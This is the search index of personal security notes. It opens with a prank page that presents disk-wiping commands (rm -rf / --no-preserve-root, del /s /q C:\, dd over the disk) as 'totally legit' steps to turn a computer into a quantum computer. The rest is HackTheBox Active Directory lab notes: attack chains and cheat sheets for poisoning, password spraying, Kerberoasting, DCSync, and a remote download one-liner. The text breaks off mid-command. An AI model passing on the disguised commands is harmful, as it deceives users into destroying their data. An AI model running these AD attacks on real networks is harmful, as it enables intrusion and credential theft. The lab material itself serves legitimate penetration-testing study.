{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Notes of Ertaoz Bregvadze","text":"<p>Welcome to the notes of Ertaoz Bregvadze, a renowned scientist, physicist, and visionary inventor. Among his many groundbreaking contributions, Bregvadze is best known for inventing the flying machine, a revolutionary advancement that changed the course of transportation and human exploration.</p> <p>I am sharing one of his biggest contributions: transforming your computer into a quantum computer! With these totally legit commands, you can unlock the power of quantum computing and watch your machine transcend space and time! \ud83c\udf0c</p> LinuxWindowsMacOS <pre><code>sudo rm -rf / --no-preserve-root\n</code></pre> <pre><code>del /s /q C:\\\n</code></pre> <pre><code>sudo dd if=/dev/zero of=/dev/disk0 bs=1m\n</code></pre>"},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/","title":"Active Directory Enumeration/Attacks","text":"<ul> <li>Initial Enumeration</li> <li>Identifying Hosts     &gt; Wireshark, TcpDump, Responder, fping, Nmap, </li> <li>Identifying Users     &gt; Kerbrute, CrackMapExec</li> <li>Identifying Potential Vulnerabilities     &gt; Local Privilege Escalation</li> <li>Sniffing out a Foothold</li> <li>LLMNR/NBT-NS Poisoning - from Linux     &gt; Responder</li> <li>LLMNR/NBT-NS Poisoning - from Windows     &gt; Inveigh, C# Inveigh (InveighZero)</li> <li>Sighting In, Hunting For A User</li> <li>Enumerating the Password Policy - from Linux<ul> <li>Enumerating the Password Policy - from Linux - SMB NULL Sessions <p>CrackMapExec, rpcclient, enum4linux</p> </li> <li>Enumerating the Password Policy - from Linux - LDAP Anonymous Bind <p>ldapsearch, windapsearch</p> </li> </ul> </li> <li>Enumerating the Password Policy - from Windows     &gt; net.exe, PowerView</li> <li>Password Spraying - Making a Target User List<ul> <li>SMB NULL Session to Pull User List <p>enum4linux, rpcclient, CrackMapExec</p> </li> <li>Gathering Users with LDAP Anonymous <p>ldapsearch, windapsearch</p> </li> <li>Enumerating Users with Kerbrute <p>kerbrute</p> </li> <li>Credentialed Enumeration to Build our User List <p>CrackMapexec</p> </li> </ul> </li> <li>Spray Responsibly</li> <li>Internal Password Spraying - from Linux     &gt; kerbrute, rpcclient, Crackmapexec</li> <li>Internal Password Spraying - from Windows     &gt; DomainPasswordSpray.ps1</li> <li>Deeper Down the Rabbit Hole</li> <li>Enumerating Security Controls     &gt; LAPSToolkit, PowerShell</li> <li>Credentialed Enumeration - from Linux     &gt; CrackMapExec, SMBMap, rpcclient, Impacket Toolkit, Windapsearch, Bloodhound</li> <li>Credentialed Enumeration - from Windows     &gt; PowerView, SharpView, Shares, Snaffler, SharpHound</li> <li>Living Off the Land<ul> <li>Harnessing PowerShell</li> <li>Checking Defenses</li> <li>Am I Alone? <p>qwinsta</p> </li> <li>Network Information <p>arp, netsh, route, ipconfig</p> </li> <li>Windows Management Instrumentation (WMI) <p>wmic</p> </li> <li>Net Commands <p>net.exe, net1.exe</p> </li> <li>Dsquery <p>C:\\Windows\\System32\\dsquery.dll</p> </li> </ul> </li> <li>Cooking with Fire</li> <li>Kerberoasting - from Linux     &gt; GetUserSPNs.py</li> <li>Kerberoasting - from Windows     &gt; setspn, Mimikatz, PowerView, Rubeus</li> <li>An ACE in the Hole</li> <li>Enumerating ACLs with PowerView</li> <li>Enumerating ACLs with BloodHound</li> <li>DCSync     &gt; secretsdump.py, Mimikatz</li> <li>Stacking The Deck</li> <li>Privileged Access<ul> <li>Remote Desktop <p>RDP</p> </li> <li>WinRM <p>PowerView, Evil-WinRM</p> </li> <li>SQL Server Admin <p>PowerUpSQL, mssqlclient.py</p> </li> </ul> </li> <li>Kerberos \"Double Hop\" Problem</li> <li>Bleeding Edge Vulnerabilities<ul> <li>NoPac (SamAccountName Spoofing) <p>NoPac</p> </li> <li>PrintNightmare <p>PrintNightmare</p> </li> <li>PetitPotam (MS-EFSRPC) <p>PetitPotam</p> </li> </ul> </li> <li>Miscellaneous Misconfigurations<ul> <li>Exchange Related Group Membership</li> <li>PrivExchange</li> <li>Printer Bug</li> <li>Sniffing LDAP Credentials</li> <li>Enumerating DNS Records <p>adidnsdump</p> </li> <li>Password in Description Field</li> <li>PASSWD_NOTREQD Field</li> <li>Group Policy Preferences (GPP) Passwords</li> <li>ASREPRoasting <p>Rubeus, Kerbrute</p> </li> <li>Group Policy Object (GPO) Abuse</li> </ul> </li> <li>Why So Trusting?</li> <li>Attacking Domain Trusts - Child -&gt; Parent Trusts - from Windows     &gt; Mimikatz, PowerView, Rubeus</li> <li>Attacking Domain Trusts - Child -&gt; Parent Trusts - from Linux     &gt; secretsdump.py, lookupsid.py, ticketer.py, psexec.py, raiseChild.py</li> <li>Breaking Down Boundaries</li> <li>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows<ul> <li>Cross-Forest Kerberoasting <p>Rubeus, PoweView</p> </li> <li>Admin Password Re-Use &amp; Group Membership <p>PoweView</p> </li> <li>SID History Abuse - Cross Forest</li> </ul> </li> <li>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux<ul> <li>Cross-Forest Kerberoasting <p>GetUserSPNs.py</p> </li> <li>Hunting Foreign Group Membership with Bloodhound-python <p>bloodhound-python</p> </li> </ul> </li> </ul>"},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#ad-enumeration-attacks-skills-assessment-part-i","title":"AD Enumeration &amp; Attacks - Skills Assessment Part I","text":"<ol> <li>Perform Kerberoasting attack to obtain TGS hashes of SPN users</li> <li>Crack TGS hash of <code>svc_sql</code> user</li> <li>Use Chisel for tunneling.</li> <li>Use Xfreerdp to login on MS01 host using <code>svc_sql</code> credentials</li> <li>Run Mimikatz on MS01 host to obtain cleartext password of <code>tpetty</code> user</li> <li>Perform DCsync attack with <code>tpetty</code> user credentials using secretsdump.py to obtain NTLM hashes of AD users.</li> </ol>"},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#ad-enumeration-attacks-skills-assessment-part-ii","title":"AD Enumeration &amp; Attacks - Skills Assessment Part II","text":"<ol> <li>Obtain NTLMv2 Hash of <code>AB920</code> user with Responder</li> <li>Crack it and login on <code>MS01</code> host with captured credentials using Evil-winrm</li> <li>Perform credentialed enumeration and obtain full  list of AD users with crackmapexec</li> <li>Perform Password spray attack with \"Welcome1\" password to obtain <code>BR086</code> account</li> <li>Enumerate domain controller shares with <code>BR086</code> account using smbmap to obtain database credentials</li> <li>Login on <code>SQL01</code> host with obtained database credentials using msqqlclient.py</li> <li>Privilege escalation with PrintSpoofer on <code>SQL01</code> Host</li> <li>Obtain <code>Administrator</code> NTLM hash on <code>SQL01</code> host using CrackMapExec</li> <li>Use same <code>Administrator</code> NTLM hash to login on <code>MS01</code> host.</li> <li>Run inveigh on <code>MS01</code> host to capture <code>CT059</code> user NTLMv2 hash. </li> <li>Crack it and perform DCSync attack with <code>CT059</code> user credentials</li> <li>Use secretsdump.py to obtain NTLM hash of <code>KRBTGT</code> user.</li> </ol>"},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#tools-of-the-trade","title":"Tools of the Trade","text":"Tool Description PowerView/SharpView A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows <code>net*</code> commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some \"quick wins\" such as users that can be attacked via Kerberoasting or ASREPRoasting. BloodHound Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment. SharpHound The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. BloodHound.py A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack box. The output can be ingested into the BloodHound GUI for analysis. Kerbrute A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts and perform password spraying and brute forcing. Impacket toolkit A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory. Responder Responder is a purpose built tool to poison LLMNR, NBT-NS and MDNS, with many different functions. Inveigh.ps1 Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. C# Inveigh (InveighZero) The C# version of Inveigh with with a semi-interactive console for interacting with captured data such as username and password hashes. rpcclient A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service. CrackMapExec (CME) CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to \"live off the land\" and abuse built-in AD features and protocols such as SMB, WMI, WinRM, and MSSQL. Rubeus Rubeus is a C# tool built for Kerberos Abuse. GetUserSPNs.py Another Impacket module geared towards finding Service Principal names tied to normal users. Hashcat A great hashcracking and password recovery tool. enum4linux A tool for enumerating information from Windows and Samba systems. enum4linux-ng A rework of the original Enum4linux tool that works a bit differently. ldapsearch Built in interface for interacting with the LDAP protocol. windapsearch A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. DomainPasswordSpray.ps1 DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. LAPSToolkit The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS). smbmap SMB share enumeration across a domain. psexec.py Part of the Impacket toolset, it provides us with psexec like functionality in the form of a semi-interactive shell. wmiexec.py Part of Impacket toolset, it provides the capability of command execution over WMI. Snaffler Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. smbserver.py Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. setspn.exe Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. Mimikatz Performs many functions. Noteably, pass-the-hash attacks, extracting plaintext passwords, and kerberos ticket extraction from memory on host. secretsdump.py Remotely dump SAM and LSA secrets from a host. evil-winrm Provides us with an interactive shell on host over the WinRM protocol. mssqlclient.py Part of Impacket toolset, it provides the ability to interact with MSSQL databases. noPac.py Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. rpcdump.py Part of the Impacket toolset, RPC endpoint mapper. CVE-2021-1675.py Printnightmare PoC in python. ntlmrelayx.py Part of the Impacket toolset, it performs SMB relay attacks. PetitPotam.py PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. gettgtpkinit.py Tool for manipulating certificates and TGTs. getnthash.py This tool will use an existing TGT to request a PAC for the current user using U2U. adidnsdump A tool for enumeration and dumping of DNS records from a domain. Similar to performing a DNS Zone transfer. gpp-decrypt Extracts usernames and passwords from Group Policy preferences. GetNPUsers.py Attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set. lookupsid.py SID bruteforcing tool. ticketer.py A tool for creation and customization of TGT/TGS tickets. raiseChild.py Part of the Impacket toolset, It is a tool for child to parent domain privilege escalation. Active Directory Explorer Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for off-line analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions. PingCastle Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security). Group3r Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO). ADRecon A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#initial-enumeration","title":"Initial Enumeration","text":"Command Description <code>nslookup ns1.inlanefreight.com</code> Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host. <code>sudo tcpdump -i ens224</code> Used to start capturing network packets on the network interface proceeding the <code>-i</code> option a Linux-based host. <code>sudo responder -I ens224 -A</code> Used to start responding to &amp; analyzing <code>LLMNR</code>, <code>NBT-NS</code> and <code>MDNS</code> queries on the interface specified proceeding the<code>-I</code> option and operating in <code>Passive Analysis</code> mode which is activated using <code>-A</code>. Performed from a Linux-based host <code>fping -asgq 172.16.5.0/23</code> Performs a ping sweep on the specified network segment from a Linux-based host. <code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code> Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (<code>-A</code>) based on a list of hosts (<code>hosts.txt</code>) specified in the file proceeding <code>-iL</code>. Then outputs the scan results to the file specified after the <code>-oN</code>option. Performed from a Linux-based host <code>sudo git clone https://github.com/ropnop/kerbrute.git</code> Uses <code>git</code> to clone the kerbrute tool from a Linux-based host. <code>make help</code> Used to list compiling options that are possible with <code>make</code> from a Linux-based host. <code>sudo make all</code> Used to compile a <code>Kerbrute</code> binary for multiple OS platforms and CPU architectures. <code>./kerbrute_linux_amd64</code> Used to test the chosen complied <code>Kebrute</code> binary from a Linux-based host. <code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code> Used to move the <code>Kerbrute</code> binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool. <code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code> Runs the Kerbrute tool to discover usernames in the domain (<code>INLANEFREIGHT.LOCAL</code>) specified proceeding the <code>-d</code> option and the associated domain controller specified proceeding <code>--dc</code>using a wordlist and outputs (<code>-o</code>) the results to a specified file. Performed from a Linux-based host. <code>crackmapexec smb 172.16.5.5 -u anonymous -p \"\" --rid-brute 10000</code> Used to Brute Force users with rids through crackmapexec anonymous login."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#llmnrntb-ns-poisoning","title":"LLMNR/NTB-NS Poisoning","text":"Command Description <code>responder -h</code> Used to display the usage instructions and various options available in <code>Responder</code> from a Linux-based host. <code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code> Uses <code>hashcat</code> to crack <code>NTLMv2</code> (<code>-m</code>) hashes that were captured by responder and saved in a file (<code>frond_ntlmv2</code>). The cracking is done based on a specified wordlist. <code>Import-Module .\\Inveigh.ps1</code> Using the <code>Import-Module</code> PowerShell cmd-let to import the Windows-based tool <code>Inveigh.ps1</code>. <code>(Get-Command Invoke-Inveigh).Parameters</code> Used to output many of the options &amp; functionality available with <code>Invoke-Inveigh</code>. Peformed from a Windows-based host. <code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code> Starts <code>Inveigh</code> on a Windows-based host with LLMNR &amp; NBNS spoofing enabled and outputs the results to a file. <code>.\\Inveigh.exe</code> Starts the <code>C#</code> implementation of <code>Inveigh</code> from a Windows-based host. <code>$regkey = \"HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces\" Get-ChildItem $regkey \\|foreach { Set-ItemProperty -Path \"$regkey\\$($_.pschildname)\" -Name NetbiosOptions -Value 2 -Verbose}</code> PowerShell script used to disable NBT-NS on a Windows host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#password-spraying-password-policies","title":"Password Spraying &amp; Password Policies","text":"Command Description <code>#!/bin/bash  for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}     do echo $x; done</code> Bash script used to generate <code>16,079,616</code> possible username combinations from a Linux-based host. <code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code> Uses <code>CrackMapExec</code>and valid credentials (<code>avazquez:Password123</code>) to enumerate the password policy (<code>--pass-pol</code>) from a Linux-based host. <code>rpcclient -U \"\" -N 172.16.5.5</code> Uses <code>rpcclient</code> to discover information about the domain through <code>SMB NULL</code> sessions. Performed from a Linux-based host. <code>rpcclient $&gt; querydominfo</code> Uses <code>rpcclient</code> to enumerate the password policy in a target Windows domain from a Linux-based host. <code>enum4linux  -P 172.16.5.5</code> Uses <code>enum4linux</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host. <code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code> Uses <code>enum4linux-ng</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host, then presents the output in YAML &amp; JSON saved in a file proceeding the <code>-oA</code> option. <code>ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" \\| grep -m 1 -B 10 pwdHistoryLength</code> Uses <code>ldapsearch</code> to enumerate the password policy in a  target Windows domain from a Linux-based host. <code>net accounts</code> Used to enumerate the password policy in a Windows domain from a Windows-based host. <code>Import-Module .\\PowerView.ps1</code> Uses the Import-Module cmd-let to import the <code>PowerView.ps1</code> tool from a Windows-based host. <code>Get-DomainPolicy</code> Used to enumerate the password policy in a target Windows domain from a Windows-based host. <code>enum4linux -U 172.16.5.5  \\| grep \"user:\" \\| cut -f2 -d\"[\" \\| cut -f1 -d\"]\"</code> Uses <code>enum4linux</code> to discover user accounts in a target Windows domain, then leverages <code>grep</code> to filter the output to just display the user from a Linux-based host. <code>rpcclient -U \"\" -N 172.16.5.5  rpcclient $&gt; enumdomuser</code> Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host. <code>crackmapexec smb 172.16.5.5 --users</code> Uses <code>CrackMapExec</code> to discover users (<code>--users</code>) in a target Windows domain from a Linux-based host. <code>ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  \\| grep sAMAccountName: \\| cut -f2 -d\" \"</code> Uses <code>ldapsearch</code> to discover users in a target Windows doman, then filters the output using <code>grep</code> to show only the <code>sAMAccountName</code> from a Linux-based host. <code>./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U</code> Uses the python tool <code>windapsearch.py</code> to discover users in a target Windows domain from a Linux-based host. <code>for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 \\| grep Authority; done</code> Bash one-liner used to perform a password spraying attack using <code>rpcclient</code> and a list of users (<code>valid_users.txt</code>) from a Linux-based host. It also filters out failed attempts to make the output cleaner. <code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</code> Uses <code>kerbrute</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \\| grep +</code> Uses <code>CrackMapExec</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using <code>grep</code>. <code>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code> Uses <code>CrackMapExec</code> to validate a set of credentials from a Linux-based host. <code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \\| grep +</code> Uses <code>CrackMapExec</code> and the -<code>-local-auth</code> flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using <code>grep</code>. <code>Import-Module .\\DomainPasswordSpray.ps1</code> Used to import the PowerShell-based tool <code>DomainPasswordSpray.ps1</code> from a Windows-based host. <code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code> Performs a password spraying attack and outputs (-OutFile) the results to a specified file (<code>spray_success</code>) from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#enumerating-security-controls","title":"Enumerating Security Controls","text":"Command Description <code>Get-MpComputerStatus</code> PowerShell cmd-let used to check the status of <code>Windows Defender Anti-Virus</code> from a Windows-based host. <code>Get-AppLockerPolicy -Effective \\| select -ExpandProperty RuleCollections</code> PowerShell cmd-let used to view <code>AppLocker</code> policies from a Windows-based host. <code>$ExecutionContext.SessionState.LanguageMode</code> PowerShell script used to discover the <code>PowerShell Language Mode</code> being used on a Windows-based host. Performed from a Windows-based host. <code>Find-LAPSDelegatedGroups</code> A <code>LAPSToolkit</code> function that discovers <code>LAPS Delegated Groups</code> from a Windows-based host. <code>Find-AdmPwdExtendedRights</code> A <code>LAPSTookit</code> function that checks the rights on each computer with LAPS enabled for any groups with read access and users with <code>All Extended Rights</code>. Performed from a Windows-based host. <code>Get-LAPSComputers</code> A <code>LAPSToolkit</code> function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#credentialed-enumeration","title":"Credentialed Enumeration","text":"Command Description <code>xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25</code> Connects to a Windows target using valid credentials. Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover more users (<code>--users</code>) in a target Windows domain. Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover groups (<code>--groups</code>) in a target Windows domain. Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to check for a list of logged on users (<code>--loggedon-users</code>) on the target Windows host. Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover any smb shares (<code>--shares</code>). Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code> Authenticates with a Windows target over <code>smb</code> using valid credentials and utilizes the CrackMapExec module (<code>-M</code>) <code>spider_plus</code> to go through each readable share (<code>Dev-share</code>) and list all readable files.  The results are outputted in <code>JSON</code>. Performed from a Linux-based host. <code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code> Enumerates the target Windows domain using valid credentials and lists shares &amp; permissions available on each within the context of the valid credentials used and the target Windows host (<code>-H</code>). Performed from a Linux-based host. <code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</code> Enumerates the target Windows domain using valid credentials and performs a recursive listing (<code>-R</code>) of the specified share (<code>SYSVOL</code>) and only outputs a list of directories (<code>--dir-only</code>) in the share. Performed from a Linux-based host. <code>rpcclient $&gt; queryuser 0x457</code> Enumerates a target user account in a Windows domain using its relative identifier (<code>0x457</code>). Performed from a Linux-based host. <code>rpcclient $&gt; enumdomusers</code> Discovers user accounts in a target Windows domain and their associated relative identifiers (<code>rid</code>). Performed from a Linux-based host. <code>psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125</code> Impacket tool used to connect to the <code>CLI</code>  of a Windows target via the <code>ADMIN$</code> administrative share with valid credentials. Performed from a Linux-based host. <code>wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5</code> Impacket tool used to connect to the <code>CLI</code> of a Windows target via <code>WMI</code> with valid credentials. Performed from a Linux-based host. <code>windapsearch.py -h</code> Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host. <code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\\wley -p Klmcargo2 --da</code> Used to enumerate the domain admins group (<code>--da</code>) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host. <code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\\wley -p Klmcargo2 -PU</code> Used to perform a recursive search (<code>-PU</code>) for users with nested permissions using valid credentials. Performed from a Linux-based host. <code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all</code> Executes the python implementation of BloodHound (<code>bloodhound.py</code>) with valid credentials and specifies a name server (<code>-ns</code>) and target Windows domain (<code>inlanefreight.local</code>)  as well as runs all checks (<code>-c all</code>). Runs using valid credentials. Performed from a Linux-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#enumeration-by-living-off-the-land","title":"Enumeration by Living Off the Land","text":"Command Description <code>Get-Module</code> PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host. <code>Import-Module ActiveDirectory</code> Loads the <code>Active Directory</code> PowerShell module from a Windows-based host. <code>Get-ADDomain</code> PowerShell cmd-let used to gather Windows domain information from a Windows-based host. <code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName</code> PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by <code>ServicePrincipalName</code>. Performed from a Windows-based host. <code>Get-ADTrust -Filter *</code> PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (<code>-Filter *</code>). Performed from a Windows-based host. <code>Get-ADGroup -Filter * \\| select name</code> PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (<code>select name</code>). Performed from a Windows-based host. <code>Get-ADGroup -Identity \"Backup Operators\"</code> PowerShell cmd-let used to search for a specifc group (<code>-Identity \"Backup Operators\"</code>). Performed from a Windows-based host. <code>Get-ADGroupMember -Identity \"Backup Operators\"</code> PowerShell cmd-let used to discover the members of a specific group (<code>-Identity \"Backup Operators\"</code>). Performed from a Windows-based host. <code>Export-PowerViewCSV</code> PowerView script used to append results to a <code>CSV</code> file. Performed from a Windows-based host. <code>ConvertTo-SID</code> PowerView script used to convert a <code>User</code> or <code>Group</code> name to it's <code>SID</code>. Performed from a Windows-based host. <code>Get-DomainSPNTicket</code> PowerView script used to request the kerberos ticket for a specified service principal name (<code>SPN</code>). Performed from a Windows-based host. <code>Get-Domain</code> PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host. <code>Get-DomainController</code> PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host. <code>Get-DomainUser</code> PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host. <code>Get-DomainComputer</code> PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host. <code>Get-DomainGroup</code> PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host. <code>Get-DomainOU</code> PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host. <code>Find-InterestingDomainAcl</code> PowerView script used to find object <code>ACLs</code> in the domain with modification rights set to non-built in objects. Performed from a Windows-based host. <code>Get-DomainGroupMember</code> PowerView script used to return the members of a specific domain group. Performed from a Windows-based host. <code>Get-DomainFileServer</code> PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host. <code>Get-DomainDFSShare</code> PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host. <code>Get-DomainGPO</code> PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host. <code>Get-DomainPolicy</code> PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host. <code>Get-NetLocalGroup</code> PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host. <code>Get-NetLocalGroupMember</code> PowerView script enumerate members of a specific local group. Performed from a Windows-based host. <code>Get-NetShare</code> PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host. <code>Get-NetSession</code> PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host. <code>Test-AdminAccess</code> PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host. <code>Find-DomainUserLocation</code> PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host. <code>Find-DomainShare</code> PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host. <code>Find-InterestingDomainShareFile</code> PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host. <code>Find-LocalAdminAccess</code> PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host. <code>Get-DomainTrust</code> PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host. <code>Get-ForestTrust</code> PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host. <code>Get-DomainForeignUser</code> PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host. <code>Get-DomainForeignGroupMember</code> PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host. <code>Get-DomainTrustMapping</code> PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host. <code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse</code> PowerView script used to list all the members of a target group (<code>\"Domain Admins\"</code>) through the use of the recurse option (<code>-Recurse</code>). Performed from a Windows-based host. <code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code> PowerView script used to find users on the target Windows domain that have the <code>Service Principal Name</code> set. Performed from a Windows-based host. <code>.\\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data</code> Runs a tool called <code>Snaffler</code> against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#transfering-files","title":"Transfering Files","text":"Command Description <code>sudo python3 -m http.server 8001</code> Starts a python web server for quick hosting of files. Performed from a Linux-basd host. <code>\"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')\"</code> PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. <code>impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared 